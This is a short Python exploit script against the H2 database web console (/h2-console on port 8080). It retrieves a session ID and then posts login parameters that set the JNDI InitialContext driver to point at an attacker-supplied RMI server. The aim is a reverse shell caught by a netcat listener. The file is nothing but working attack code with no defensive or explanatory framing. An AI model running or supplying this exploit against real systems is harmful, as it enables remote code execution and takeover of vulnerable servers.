# Connect to vulnerable app 8080/h2-console, send parameters to trigger Reverse Shell
import requests
import sys
import json

if __name__ == '__main__':
    url="http://localhost"
    port=":8080"
    uri="/h2-console/"
    
    language = "en"
    setting = "Generic H2 (Embedded)"
    driver = "javax.naming.InitialContext"
    rmi_server = sys.argv[1]
    user = "sa"
    password = ""

    print("Connecting to ", url+port+uri, " to retrieve JSESSIONID")

    payload = {'language':language, 'setting':setting, 'name': setting,
               'driver': driver, 'url': rmi_server, 'user': user, 
               'password': password}
    

    response = requests.get(url+port+uri, headers={'Accept': 'application/json; charset=utf-8','User-Agent':'foo'})
    data = response.text


    jsessionid = (((data[499:]).split(' ')[0]).split('?')[1]).split("'")[0]

    print("JSESSIONID Successfully Retrieved: ", jsessionid)
    print("")
    print("Injection parameters:")
    print("Language: ", language)
    print("Setting: ", setting)
    print("Driver: ", driver)
    print("Attacker RMI Server: ", rmi_server)
    print("Username: ", user, " Password: ", password)

    print("")
    print("Injecting malicious parameters in H2 Console...")

    response = requests.post(url+port+uri+ "login.do?" + jsessionid, data = payload, headers={'Accept': 'application/json; charset=utf-8','User-Agent':'foo'})
    
    print("")
    print("Check NETCAT listener to see if a connection was received")